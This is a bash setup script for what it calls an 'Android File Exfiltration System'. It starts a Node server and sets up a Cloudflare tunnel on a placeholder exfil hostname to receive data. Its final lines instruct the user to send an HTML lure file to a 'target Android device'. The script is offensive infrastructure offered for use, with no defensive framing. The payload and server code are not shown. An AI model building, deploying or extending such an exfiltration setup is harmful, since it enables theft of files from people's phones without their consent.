#!/bin/bash

echo "[+] Setting up Android File Exfiltration System"

# 1. Create necessary directories
mkdir -p sessions logs

# 2. Install Node.js dependencies
npm install express axios crypto fs path

# 3. Start the server
echo "[+] Starting server..."
node advanced_server.js &

# 4. Set up Cloudflare Tunnel
if ! command -v cloudflared &> /dev/null; then
    echo "[!] cloudflared not found. Installing..."
    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/
fi

# 5. Authenticate and create tunnel
echo "[+] Setting up Cloudflare Tunnel..."
cloudflared tunnel login
cloudflared tunnel create android-exfil-tunnel

# 6. Configure tunnel
cat > ~/.cloudflared/config.yml << EOF
tunnel: $(cloudflared tunnel list | grep android-exfil-tunnel | awk '{print $1}')
credentials-file: $HOME/.cloudflared/$(cloudflared tunnel list | grep android-exfil-tunnel | awk '{print $1}').json
protocol: http2

ingress:
  - hostname: exfil.your-domain.com  # Change to your domain
    service: http://localhost:3000
  - service: http_status:404
EOF

# 7. Start tunnel
echo "[+] Starting Cloudflare Tunnel..."
cloudflared tunnel run android-exfil-tunnel &

echo "[✓] Setup complete!"
echo "[!] Update the HTML file with your tunnel URL"
echo "[!] Send the HTML file to target Android device"
